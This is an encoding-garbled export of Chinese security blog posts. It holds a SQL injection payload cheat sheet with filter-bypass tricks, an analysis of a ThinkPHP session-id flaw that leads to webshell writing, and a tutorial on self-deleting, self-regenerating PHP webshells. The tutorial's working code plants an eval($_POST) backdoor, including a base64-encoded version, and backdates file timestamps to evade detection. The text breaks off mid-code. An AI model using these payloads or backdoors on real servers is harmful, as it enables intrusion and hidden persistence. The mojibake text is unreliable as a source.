åˆ°åº”ç”¨ï¼ˆç”¨æˆ·ï¼‰çš„è¾“å…¥å‚æ•°ä¸­çš„æ”»å‡»ï¼Œä¹‹åå†å°†è¿™äº›å‚æ•°ä¼ é€’ç»™åå°çš„SQLæœåŠ¡å™¨åŠ ä»¥è§£æå¹¶æ‰§è¡Œ /sql.php?uid=1 /sql.php?uid=1 or 1=1 SQLæ³¨å…¥ï¼šå†…è”æ³¨å…¥æ˜¯æŒ‡æ’å…¥æŸ¥è¯¢æ³¨å…¥SQLä»£ç åï¼ŒåŸæ¥çš„æŸ¥è¯¢ä¾ç„¶ä¼šå…¨éƒ¨æ‰§è¡Œ [æ³¨å…¥]-----&gt;[åŸæ¥çš„è¯­å¥]=========&gt;[åŸæ¥çš„(æ³¨å…¥)è¯­å¥] ç¡®è®¤æ³¨å…¥ç‚¹###å­—ç¬¦ä¸²æ³¨å…¥çš„ç‰¹å¾å€¼ æµ‹è¯•å­—ç¬¦ä¸² å˜ç§ é¢„æœŸç»“æœ â€˜ è§¦å‘é”™è¯¯ã€‚å¦‚æœæˆåŠŸï¼Œæ•°æ®åº“å°†è¿”å›ä¸€ä¸ªé”™è¯¯ 1â€™ or â€˜1â€™=â€™1 1â€™) or (â€˜1â€™=â€™1 æ’ä¸ºçœŸæ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›è¡¨ä¸­æ‰€æœ‰çš„è¡Œ valueâ€™ or â€˜1â€™=â€™2 value1â€™) or (â€˜1â€™=â€™2 ç©ºæ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›ä¸åŸæ¥çš„å€¼ç›¸åŒçš„ç»“æœ 1â€™and â€˜1â€™=â€™1 1â€™) adn (â€˜1â€™=1 æ’ä¸ºå‡æ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™ä¸è¿”å›è¡¨ä¸­ä»»ä½•è¡Œ 1â€™ or â€˜abâ€™ =â€™aâ€™+â€™b 1â€™) or (â€˜abâ€™=â€™aâ€™+â€™b Sql serverä¸²è”ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯ 1â€™ or â€˜abâ€™ =â€™aâ€™ â€˜b 1â€™) or (â€˜abâ€™=â€™aâ€™ â€˜b Mysqlä¸²è”ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯ 1â€™ or â€˜abâ€™=â€™aâ€™||â€™b 1â€™) or (â€˜abâ€™=â€™aâ€™||â€™b Oracleä¸²è”ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯ æ•°å­—æ³¨å…¥çš„ç‰¹å¾å€¼ æµ‹è¯•å­—ç¬¦ä¸² å˜ç§ é¢„æœŸç»“æœ â€˜ è§¦å‘é”™è¯¯ã€‚å¦‚æœæˆåŠŸï¼Œæ•°æ®åº“å°†è¿”å›ä¸€ä¸ªé”™è¯¯ 1+1 2-1 å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›ä¸æ“ä½œç»“æœç›¸åŒçš„å€¼ value+1 å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›ä¸åŸæ¥è¯·æ±‚ç›¸åŒçš„å€¼ or 1 = 1 1) or (1-1 æ’ä¸ºçœŸæ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›è¡¨ä¸­æ‰€æœ‰çš„è¡Œ value or 1=2 value) or (1=2 ç©ºæ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›ä¸åŸæ¥çš„å€¼ç›¸åŒçš„ç»“æœ and 1=2 and (1=2 æ’ä¸ºå‡æ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™ä¸è¿”å›è¡¨ä¸­ä»»ä½•è¡Œ 1â€™ or â€˜abâ€™ =â€™aâ€™+â€™b 1â€™) or (â€˜abâ€™=â€™aâ€™+â€™b Sql serverä¸²è”ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯ 1â€™ or â€˜abâ€™ =â€™aâ€™ â€˜b 1â€™) or (â€˜abâ€™=â€™aâ€™ â€˜b Mysqlä¸²è”ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯ 1â€™ or â€˜abâ€™=â€™aâ€™||â€™b 1â€™) or (â€˜abâ€™=â€™aâ€™||â€™b Oracleä¸²è”ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯ æ˜¾é”™æ³¨å…¥è”åˆæŸ¥è¯¢union selectä½¿ç”¨è”åˆæŸ¥è¯¢éœ€è¦æ³¨æ„ï¼Œå‰é¢çš„å­—æ®µéœ€è¦å’Œåé¢çš„å­—æ®µæ•°ç›¸ç­‰ï¼š select id,user,content from users where id=1 union select 1,2,3 ###order by å½“æˆ‘ä»¬ä½¿ç”¨ order by 4 æˆåŠŸï¼Œä½¿ç”¨order by 5æŠ¥é”™æ—¶ å°±å¯ä»¥åˆ¤æ–­å­—æ®µä¸º4 order byæ˜¯mysqlä¸­å¯¹æŸ¥è¯¢æ•°æ®è¿›è¡Œæ’åºçš„æ–¹æ³•ï¼Œ ä½¿ç”¨ç¤ºä¾‹ select * from è¡¨å order by åˆ—å(æˆ–è€…æ•°å­—) ascï¼›å‡åº(é»˜è®¤å‡åº) select * from è¡¨å order by åˆ—å(æˆ–è€…æ•°å­—) descï¼›é™åº æ‰€ä»¥å¯ä»¥åˆ©ç”¨order by æ¥æŸ¥è¯¢å­—æ®µæ•° #(æ³¨é‡Šç¬¦)åœ¨è¯­å¥æœ«å°¾ï¼Œæ³¨é‡ŠæŸ¥è¯¢è¯­å¥åé¢çš„å¤šä½™å­—ç¬¦ select * from users where id = '1' select * from users where id = '1' union select 1,2,3 #' #å¯ä»¥è¢«--+ä»£æ›¿ information_schemaåº“Mysql5ç‰ˆæœ¬ä¹‹åï¼Œç”±äºinformation_schemaåº“çš„å­˜åœ¨ï¼Œæ³¨å…¥æ”»å‡»ç›¸å¯¹æ¥è¯´æ–¹ä¾¿äº†è®¸å¤šï¼Œå…¶ä½¿ç”¨æ–¹æ³•é€šå¸¸ä¸ºå¦‚ä¸‹å‡ ç§ï¼š é€šè¿‡å¯¹Mysqlçš„æ•°æ®è¿›è¡ŒçŒœè§£è·å–æ•æ„Ÿçš„ä¿¡æ¯ï¼Œæ¥è¿›ä¸€æ­¥é€šè¿‡ç½‘ç«™çš„å„ç§åŠŸèƒ½è·å–æ§åˆ¶æƒã€‚ é€šè¿‡load_file()å‡½æ•°æ¥è¯»å–è„šæœ¬ä»£ç æˆ–ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶å†…å®¹ï¼Œè¿›è¡Œæ¼æ´åˆ†ææˆ–ç›´æ¥è·å–æ•°æ®åº“è¿æ¥è´¦å·ã€å¯†ç ã€‚ é€šè¿‡dumpfile/outfileå‡½æ•°å¯¼å‡ºè·å–webshell åˆ©ç”¨ä¸Šé¢çš„è¿™å‡ ç§æ–¹æ³•ï¼Œå¯ä»¥å¾ˆè½»æ˜“åœ°æ”»å‡»å…¥ä¾µMysql5æ•°æ®åº“æ­å»ºçš„ç½‘ç«™æœåŠ¡å™¨ ç®€å•çš„æ³¨å…¥æµç¨‹?id=1'//æµ‹è¯•æ³¨å…¥ç‚¹ ?id=1' order by 5#//çŒœå­—æ®µ ?id=0' union select 1,2,3,4# //æµ‹è¯•é¡µé¢å›æ˜¾ ?id=0' union select 1,database(),3,4# //æŸ¥çœ‹æ•°æ®åº“å ?id=0' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='db'# ?id=0' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name ='flag'# ?id=0' union select 1,content,3,4 from flag# æŠ¥é”™æ³¨å…¥æŠ¥é”™å‡½æ•°extractvalue() ä½œç”¨æ˜¯ä»ç›®æ ‡xmlç§è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼å¾—å­—ç¬¦ä¸² id = 1 and (extractvalue(1,concat(0x5c,(select user())))); updatexml() ä½œç”¨å°±æ˜¯æ”¹å˜ï¼ˆæŸ¥æ‰¾å¹¶æ›¿æ¢ï¼‰xmlæ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹å€¼ id = 1 and(updatexml(0x3a,concat(1,(select user())),1)); 0x3aæ˜¯:çš„ä½œç”¨ è€Œä¸”updatexml()è¾ƒä¸ºå¸¸ç”¨ æ³¨å…¥æ¨¡æ¿ï¼š id = 1 and(updatexml(0x3a,concat(1,(select database())),1)); id = 1 and(updatexml(0x3a,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema='db')),1)); id = 1 and(updatexml(0x3a,concat(1,(select group_concat(colunm_name) from information_schema.column where table_name='flag')),1)); id = 1 and(updatexml(0x3a,concat(1,(select content from flag)),1)); id = 1 and(updatexml(0x3a,concat(1,(select substring(content,1,10)from flag)),1)); exp() å½“ä¼ é€’æœ‰ä¸€ä¸ªå¤§äº709çš„å€¼ï¼Œå‡½æ•°exp()å°±ä¼šå¼•èµ·ä¸€ä¸ªæº¢å‡ºé”™è¯¯ id = 1 and EXP(~(select * from(select user())a)); floor() flooræ˜¯mysqlçš„ä¸€ä¸ªå–æ•´å‡½æ•° id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); ç›²æ³¨å¸ƒå°”ç›²æ³¨å¸ƒå°”ç›²æ³¨å¯èƒ½ç”¨åˆ°çš„å‡½æ•°ascii()æ‹¬å·ä¸­çš„å‚æ•°è½¬åŒ–ä¸ºç›¸åº”çš„asciiç  substr()substr(a,b,c)ä»bä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²açš„cé•¿åº¦ mid()ç”¨æ³•ä¸substr()ç±»ä¼¼ length()è¿”å›strå­—ç¬¦ä¸²çš„é•¿åº¦ left(database(),1)å–databaseå­—ç¬¦ä¸²çš„å·¦è¾¹ç¬¬ä¸€ä¸ª æ—¶é—´ç›²æ³¨å¯èƒ½ç”¨åˆ°çš„å‡½æ•°if(a,b,c)aä¸ºæ¡ä»¶ï¼Œaä¸ºtrueï¼Œè¿”å›bï¼Œå¦åˆ™è¿”å›cï¼Œå¦‚if(1&gt;2,1,0)ï¼Œè¿”å›0 sleep()æ‰§è¡ŒæŒ‚èµ·ä¸€æ®µæ—¶é—´ åˆ©ç”¨æ–¹å¼ï¼š and if(mid(version(),1,1)=1,sleep(10),1) ç›²æ³¨è„šæœ¬= = ç™¾åº¦ä¸Šå¾ˆå¤š è‡ªå·±å†™ï¼ï¼ ç»•è¿‡æ–¹æ³•å¤§å°å†™ç»•è¿‡&lt;?php include ('config.php'); highlight_file(__FILE__); $id=$_REQUEST[\"id\"]; if (preg_match('/select|union/',$id)){ die('hack'); } $result=mysqli_query($con,\"SELECT first_name,lastname FROM users WHERE user_id='$id';\"); $row =mysqli_fetch_array($result); echo $row['firstname'].':'.$row['lastname']; ?&gt; if (preg_match('/select/union/',$id)){ die('hack'); } å› ä¸ºè¿™é‡Œæ²¡åŠ /select/union/i æ‰€ä»¥å¯ä»¥ sqlè¯­å¥æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„å°‘æ•°æƒ…å†µä¸‹ä»£ç ä¸­æ²¡æœ‰è¿‡æ»¤å®Œæ•´å°±å¯ä»¥ä½¿ç”¨å¤§å°å†™çš„æ–¹æ³•ç»•è¿‡ åŒå†™ç»•è¿‡&lt;?php include ('config.php'); highlight_file(__FILE__); $id=$_REQUEST[\"id\"]; $id=preg_replace('/select|union/i','',$id); $result=mysqli_query($con,\"SELECT first_name,lastname FROM users WHERE user_id='$id';\"); $row =mysqli_fetch_array($result); echo $row['firstname'].':'.$row['lastname']; ?&gt; ä»£ç ä¸­ä½¿ç”¨preg_replace()å‡½æ•°å¯¹å…³é”®å­—è¿›è¡Œæ›¿æ¢ï¼Œå¹¶ä¸”åªè¿›è¡Œäº†ä¸€æ¬¡æ›¿æ¢ï¼Œå¯ä»¥ä½¿ç”¨åŒå†™çš„æ–¹æ³•æ¥ç»•è¿‡ ç©ºæ ¼ç»•è¿‡&lt;?php include ('config.php'); highlight_file(__FILE__); $id=$_REQUEST[\"id\"]; if (preg_match('/ /i',$id)){ die('hack'); } $result=mysqli_query($con,\"SELECT first_name,lastname FROM users WHERE user_id='$id';\"); $row =mysqli_fetch_array($result); echo $row['firstname'].':'.$row['lastname']; ?&gt; å½“ç©ºæ ¼è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ï¼š /**/ /*!*/ %0a %0b %0c %0d %09 #å·ç»•è¿‡&lt;?php include ('config.php'); highlight_file(__FILE__); $id=$_REQUEST[\"id\"]; if (preg_match('/#/i',$id)){ die('hack'); } $result=mysqli_query($con,\"SELECT first_name,lastname FROM users WHERE user_id='$id';\"); $row =mysqli_fetch_array($result); echo $row['firstname'].':'.$row['lastname']; ?&gt; #æ˜¯æ³¨é‡Šç¬¦ï¼Œå¯ä»¥ç”¨å…¶ä»–æ³¨é‡Šç¬¦ç»•è¿‡ --+ -- ` ; /**/ é€—å·ç»•è¿‡&lt;?php include ('config.php'); highlight_file(__FILE__); $id=$_REQUEST[\"id\"]; if (preg_match('/,/i',$id)){ die('hack'); } $result=mysqli_query($con,\"SELECT first_name,lastname FROM users WHERE user_id='$id';\"); $row =mysqli_fetch_array($result); echo $row['firstname'].':'.$row['lastname']; ?&gt; é€—å·æ— æ³•ç”¨æ›¿æ¢æ³•ç»•è¿‡ï¼Œæ‰€ä»¥éœ€è¦å…¶ä»–å‡½æ•°æ¥ç»•è¿‡ union select 1,2# ç­‰ä»·äº union select * from (select 1)a join (select 2)b# åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ã€éœ€è¦åœ¨ç›²æ³¨ä¸­ç»•è¿‡é€—å· ä½¿ç”¨substr()ã€mid()è¿™ä¸¤ä¸ªè¯­å¥éƒ½å¯ä»¥ä½¿ç”¨from foræ¥ç»•è¿‡ and ascii(mid((database()),1,1))=1# ç­‰ä»·äº and ascii(mid((database())from 1 for 1))=1# sleep()ç»•è¿‡sleep()é€šå¸¸ä½¿ç”¨åœ¨ç›²æ³¨çš„å»¶æ—¶æ³¨å…¥ä¸­ å¦‚æœsleep()è¢«banï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨benchmark()å‡½æ•° ##substr()ç»•è¿‡ substr()é€šå¸¸ä¹Ÿåœ¨ç›²æ³¨ä¸­ å¯ä»¥ç”¨mid()ã€substring()ã€left()ã€right()æ›¿æ¢","categories":[{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Thinkphp < 6.0.2 session idæœªä½œè¿‡æ»¤å¯¼è‡´getshell","slug":"Thinkphp  6.0.2 session idæœªä½œè¿‡æ»¤å¯¼è‡´getshell","date":"2021-11-22T11:42:05.858Z","updated":"2021-11-22T11:47:46.212Z","comments":true,"path":"posts/d1a4aa03.html","link":"","permalink":"http://h3geeker.top/posts/d1a4aa03.html","excerpt":"","text":"Thinkphp &lt; 6.0.2 session idæœªä½œè¿‡æ»¤å¯¼è‡´getshellä¸€ã€æ¼æ´ç®€ä»‹Thinkphp &lt; 6.0.2 session idæœªä½œè¿‡æ»¤å¯¼è‡´getshell äºŒã€æ¼æ´å½±å“Thinkphp &lt; 6.0.2 ä¸‰ã€æ¼æ´åˆ†æ6.0.1åœ¨è®¾ç½®session idæ—¶æœªå¯¹å€¼è¿›è¡Œctype_alnum()æ ¡éªŒï¼Œä»è€Œå¯¼è‡´å¯ä»¥ä¼ å…¥ä»»æ„å­—ç¬¦ã€‚ çœ‹ä¸€ä¸‹ä¿å­˜sessionæ˜¯æ€ä¹ˆå†™çš„ public function save(): void { $this-&gt;clearFlashData(); $sessionId = $this-&gt;getId(); if (!empty($this-&gt;data)) { $data = $this-&gt;serialize($this-&gt;data); $this-&gt;handler-&gt;write($sessionId, $data); } else { $this-&gt;handler-&gt;delete($sessionId); } $this-&gt;init = false; } å…ˆè·å–sessionidï¼Œç„¶åä½œä¸ºå‚æ•°ä¼ å…¥ $this-&gt;handler-&gt;write($sessionId, $data),$this-&gt;handleråœ¨æ„é€ å‡½æ•°ä¸­è¢«åˆå§‹åŒ– è·Ÿè¿›æŸ¥çœ‹ä¸€ä¸‹ public function __construct($name, SessionHandlerInterface $handler, array $serialize = null) { $this-&gt;name = $name; $this-&gt;handler = $handler; if (!empty($serialize)) { $this-&gt;serialize = $serialize; } $this-&gt;setId(); } å¯ä»¥çœ‹å‡º$handlerçš„ç±»å‹æ˜¯SessionHandlerInterfaceï¼Œå…¨å±€å‘ç°è¿™æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®ç°è¿™ä¸ªæ¥å£çš„ç±»æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯Fileï¼Œä¸€ä¸ªæ˜¯Cacheã€‚è¿™é‡Œä»¥Fileç±»ä¸ºä¾‹ï¼Œæˆ‘ä»¬è·Ÿè¿›å®ƒçš„write()æ–¹æ³• public function write(string $sessID, string $sessData): bool { $filename = $this-&gt;getFileName($sessID, true); $data = $sessData; if ($this-&gt;config['data_compress'] &amp;&amp; function_exists('gzcompress')) { //æ•°æ®å‹ç¼© $data = gzcompress($data, 3); } return $this-&gt;writeFile($filename, $data); } è¿™é‡Œå…ˆé€šè¿‡ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆä¹Ÿå°±æ˜¯session idï¼‰æ¥æ„é€ $filenameï¼Œç„¶ååˆ¤æ–­æ˜¯å¦éœ€è¦å¯¹sessionæ•°æ®è¿›è¡Œå‹ç¼©ï¼Œé»˜è®¤æ˜¯ä¸éœ€è¦çš„ï¼Œæœ€åreturnæ—¶è°ƒç”¨$this-&gt;writeFile()ã€‚å…ˆçœ‹çœ‹æ–‡ä»¶åæ˜¯å¦‚ä½•æ„é€ çš„ï¼Œè·Ÿè¿›$this-&gt;getFileName() protected function getFileName(string $name, bool $auto = false): string { if ($this-&gt;config['prefix']) { $name = $this-&gt;config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name; } else { $name = 'sess_' . $name; } $filename = $this-&gt;config['path'] . $name; ... return $filename; } è¿™é‡Œç›´æ¥å°†ç¬¬ä¸€ä¸ªå‚æ•°æ‹¼æ¥åˆ°è·¯å¾„çš„æœ€åã€‚è·Ÿè¿›ä¹‹å‰çš„$this-&gt;writeFile()æ–¹æ³• protected function writeFile($path, $content): bool { return (bool) file_put_contents($path, $content, LOCK_EX); } è¿™é‡Œç”¨åˆ°äº†file_put_contents()ä¿å­˜æ–‡ä»¶ï¼Œä½†æ˜¯ç¨‹åºæœªå¯¹session idè¿›è¡Œå±é™©å­—ç¬¦åˆ¤æ–­ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ¥å†™å…¥webshell.php ç»§ç»­å¾€ä¸‹çœ‹ public function handle($request, Closure $next) { // Sessionåˆå§‹åŒ– $varSessionId = $this-&gt;app-&gt;config-&gt;get('session.var_session_id'); $cookieName = $this-&gt;session-&gt;getName(); if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) { $sessionId = $request-&gt;request($varSessionId); } else { $sessionId = $request-&gt;cookie($cookieName); } if ($sessionId) { $this-&gt;session-&gt;setId($sessionId); } è¿™é‡Œçš„$sessionIdçš„å€¼ç”±$request-&gt;cookie($cookieName)è·å¾—ï¼Œ$cookieNameç»è¿‡è·Ÿè¿›åå‘ç°é»˜è®¤æ˜¯PHPSESSID æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¾ç½®Cookieä¸­çš„PHPSESSIDçš„å€¼ä¸ºxxxxx.php å››ã€æ¼æ´å¤ç°å¤ç°ä¹‹å‰æˆ‘ä»¬éœ€è¦å¼€å¯session åœ¨\\app\\middleaware.phpä¸­æŠŠ\\think\\middleware\\SessionInit::classæ³¨é‡Šå–æ¶ˆ ç„¶ååœ¨\\app\\controller\\index.phpä¸­åŠ å…¥å…¥å£ ç„¶åbpæŠ“åŒ…ï¼Œæ„é€ poc å‘ç°å†™å…¥æˆåŠŸäº†ï¼Œè®¿é—®ä¸€ä¸‹å†™å…¥çš„æ–‡ä»¶ äº”ã€æ¼æ´å¤ç°1ã€å¯¹session id åŠ ä¸€ä¸ªè¿‡æ»¤ï¼Œä½¿ç”¨ctype_alnum() $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ctype_alnumï¼ˆ$idï¼‰ &amp;&amp; ? $id : md5(microtime(true) . session_create_id()); 2ã€æ›´æ–°Thinkphpç‰ˆæœ¬","categories":[{"name":"CVEå¤ç°","slug":"CVEå¤ç°","permalink":"http://h3geeker.top/categories/CVE%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CVEæ¼æ´å¤ç°","slug":"CVEæ¼æ´å¤ç°","permalink":"http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"PHPä¸æ­»é©¬åˆæ¢","slug":"phpä¸æ­»ğŸ","date":"2021-11-22T11:41:14.069Z","updated":"2021-11-22T12:00:08.689Z","comments":true,"path":"posts/a0ce185.html","link":"","permalink":"http://h3geeker.top/posts/a0ce185.html","excerpt":"","text":"ä»€ä¹ˆæ˜¯ä¸æ­»é©¬å†…å­˜é©¬ï¼Œé€šä¿—è®²å°±æ˜¯ä¸æ­»é©¬ï¼Œå°±æ˜¯ä¼šè¿è¡Œä¸€æ®µæ°¸è¿œä¸é€€å‡ºçš„ç¨‹åºå¸¸é©»åœ¨PHPè¿›ç¨‹é‡Œï¼Œæ— é™æ‰§è¡Œã€‚ æµç¨‹å¤§æ¦‚ä¸ºï¼šä¸æ­»é©¬.phpâ€“&gt;ä¸Šä¼ åˆ°æœåŠ¡å™¨â€“&gt;æœåŠ¡å™¨æ‰§è¡Œâ€“&gt;åœ¨æœåŠ¡å™¨ä¸Šå¾ªç¯ç”Ÿæˆ ç”¨ä»¥ä¸Šæµç¨‹è¾¾åˆ°ä¸æ­»çš„æ•ˆæœ å¯ç”¨çš„phpå‡½æ•°1.ignore_user_abort(true); --&gt;å‡½æ•°è®¾ç½®ä¸å®¢æˆ·æœºæ–­å¼€æ˜¯å¦ä¼šç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚è¿™é‡Œè®¾ç½®ä¸ºtrueåˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€ï¼Œå³ä½¿ä¸å®¢æˆ·æœºæ–­å¼€è„šæœ¬ä»ä¼šæ‰§è¡Œã€‚ 2.set_time_limit() --&gt;å‡½æ•°è®¾ç½®è„šæœ¬æœ€å¤§æ‰§è¡Œæ—¶é—´ã€‚è¿™é‡Œè®¾ç½®ä¸º0ï¼Œå³æ²¡æœ‰æ—¶é—´æ–¹é¢çš„é™åˆ¶ã€‚ 3.unlink(__FILE__) --&gt;åˆ é™¤æ–‡ä»¶æœ¬èº«ï¼Œä»¥èµ·åˆ°éšè”½è‡ªèº«çš„ä½œç”¨ã€‚ 4.system() --&gt;æ‰§è¡Œçš„å‘½ä»¤ç”¨äºä¿®æ”¹æ–‡ä»¶çš„åˆ›å»ºæˆ–ä¿®æ”¹æ—¶é—´ï¼Œå¯ä»¥ç»•è¿‡â€œfind â€“name '*.php' â€“mmin -10â€å‘½ä»¤æ£€æµ‹æœ€è¿‘10åˆ†é’Ÿä¿®æ”¹æˆ–æ–°åˆ›å»ºçš„PHPæ–‡ä»¶ï¼Œä½†ä¸ä¸€å®šæœ‰ç”¨ï¼Œå¯é€‰ã€‚ æ¥ä¸ªç®€å•çš„ä¾‹å­&lt;?php ignore_user_abort(true); //å‡½æ•°è®¾ç½®ä¸å®¢æˆ·æœºæ–­å¼€æ˜¯å¦ä¼šç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚è¿™é‡Œè®¾ç½®ä¸ºtrueåˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€ï¼Œå³ä½¿ä¸å®¢æˆ·æœºæ–­å¼€è„šæœ¬ä»ä¼šæ‰§è¡Œã€‚ set_time_limit(0); //å‡½æ•°è®¾ç½®è„šæœ¬æœ€å¤§æ‰§è¡Œæ—¶é—´ã€‚è¿™é‡Œè®¾ç½®ä¸º0ï¼Œå³æ²¡æœ‰æ—¶é—´æ–¹é¢çš„é™åˆ¶ã€‚ unlink(__FILE__); //åˆ é™¤æ–‡ä»¶æœ¬èº«ï¼Œä»¥èµ·åˆ°éšè”½è‡ªèº«çš„ä½œç”¨ã€‚ $file = '2.php'; $code = '&lt;?php if(md5($_GET[\"pass\"])==\"1a1dc91c907325c69271ddf0c944bc72\"){@eval($_POST[a]);} ?&gt;'; while (1){ file_put_contents($file,$code); //å°†ä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ system('touch -m -d \"2021-09-07 09:10:12\" .2.php'); usleep(5000); } ?&gt; å…·ä½“çš„æ€è·¯å°±æ˜¯ï¼Œå°±æ˜¯è®©å®¢æˆ·æœºæ–­å¼€çš„æ—¶å€™ï¼Œä¸æ­»é©¬ä¹Ÿæ˜¯å¯ä»¥è¿è¡Œ ç„¶åä¸æ–­çš„ç”Ÿæˆæ–°çš„åé—¨æ–‡ä»¶ æŠŠè‡ªå·±åˆ é™¤ï¼Œè¾¾åˆ°éšè—çš„ç›®çš„ .ä¸ºå‰ç¼€çš„æ–‡ä»¶ï¼Œè¿˜å¯ä»¥éšè—åé—¨æ–‡ä»¶æœ¬èº« æˆ‘ä»¬æ¥è¯•ä¸€ä¸‹ æµ‹è¯•ç¯å¢ƒä¸º kali è™šæ‹Ÿæœº åœ¨å®éªŒç¯å¢ƒä¸‹åˆ›å»ºé©¬æ¥æ¨¡æ‹ŸçœŸæ˜¯ç¯å¢ƒ æŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹ è¿™æ˜¯å®éªŒå¼€å§‹å‰çš„è¿›ç¨‹ ç„¶åç»™äºˆshell.phpæ–‡ä»¶çš„æƒé™ ç„¶åè¿è¡Œä¸€ä¸‹ å¯ä»¥çœ‹åˆ° åŸç”Ÿæˆæ–‡ä»¶å·²ç»è‡ªæˆ‘åˆ é™¤ æŸ¥çœ‹è¿›ç¨‹ å·²ç»å†™å…¥åˆ°å†…å­˜ æˆ‘ä»¬å°è¯•åˆ é™¤ç”Ÿæˆçš„shellæ–‡ä»¶ ä¼šè¿…é€Ÿå†ç”Ÿ è€Œä¸”æ‰“å¼€æ–‡ä»¶ä¼šæç¤ºä¸€ç›´åœ¨ä¿®æ”¹ æ­¤æ—¶è§£å†³åŠæ³•ï¼š 1ã€æŸ¥çœ‹è¿›ç¨‹ç„¶åkillæ‰è¿›ç¨‹æœ€ååˆ é™¤æœ¨é©¬ 2ã€é‡å¯ç„¶ååˆ é™¤æœ¨é©¬ æˆåŠŸæ¸…æ¥šæœ¨é©¬æ–‡ä»¶ å½“ç„¶è¿™åªæ˜¯æœ€ç®€å•çš„æœ¨é©¬æ–‡ä»¶ ä¸‹é¢æˆ‘ä»¬æ¥æ”¹è¿›ä¸€ä¸‹ &lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '2.php'; $code = '&lt;?php if(md5($_GET[\"pass\"])==\"1a1dc91c907325c69271ddf0c944bc72\"){@eval($_POST[a]);} ?&gt;'; while (1){ file_put_contents($file,$code); system('touch -m -d \"2018-12-01 09:10:12\" .2.php'); usleep(5000); } ?&gt; å¦‚æœæˆ‘ä»¬å°† $code = '&lt;?php if(md5($_GET[\"pass\"])==\"1a1dc91c907325c69271ddf0c944bc72\"){@eval($_POST[a]);} ?&gt;'; æ³¨é‡Šæ‰å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªshell æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨å°†shellbase64åŠ å¯† åŒæ—¶è¿›è¡Œmd5æ ¡éªŒ è¿™æ ·æ›´åŠ å®‰å…¨ &lt;?php ignore_user_abort(true); set_time_limit(0); $file = 'c.php'; $code = base64_decode('PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+'); while(true) { if(md5(file_get_contents($file))===md5($code)) { file_put_contents($file, $code); } usleep(50); } ?&gt; emmm è²Œä¼¼phpä¸æ­»é©¬ ç›®å‰æˆ‘åªèƒ½å†™è¿™ä¹ˆå¤šäº† ä½†æ˜¯æœ‰ä¸ªå¼Šç«¯ è¢«æ”»å‡»è€…æ›´æ¢ç›®å½•ï¼Œæˆ–è€…æŠŠç›®å½•ç§»èµ° æœ¨é©¬å°±ä¼šå¤±æ•ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥éå†æ–‡ä»¶å¤¹æ¯ä¸ªéƒ½å†™ éšä¾¿æ¿€æ´»ä¸€ä¸ªå³å¯ &lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while(1){ sleep(1); if(file_exists('index.php')){ 